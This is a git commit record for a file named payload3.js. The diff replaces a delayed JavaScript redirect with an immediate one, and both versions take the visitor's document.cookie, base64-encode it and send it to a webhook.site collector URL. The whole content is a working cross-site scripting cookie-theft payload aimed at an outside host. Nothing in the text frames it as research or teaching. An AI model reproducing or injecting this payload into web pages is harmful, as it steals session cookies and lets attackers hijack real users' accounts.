887e9b081250e64bfeeb5769643806a2decdaa3e
s25553258troy <s25553258troy@gmail.com>
2026-03-06 21:32:11 +0800

    Update payload3.js

--- payload3.js
+++ payload3.js
@@ -1,5 +1,1 @@
-window.addEventListener('load', (event) => {
-    setTimeout(() => {
-        window.location.href = 'https://webhook.site/42f11bf0-1050-40d9-9fe6-bfe53dade7cb/?c=' + btoa(document.cookie);
-    }, 2000);
-});
+document.location.assign("https://webhook.site/42f11bf0-1050-40d9-9fe6-bfe53dade7cb/?c=" + btoa(document.cookie));
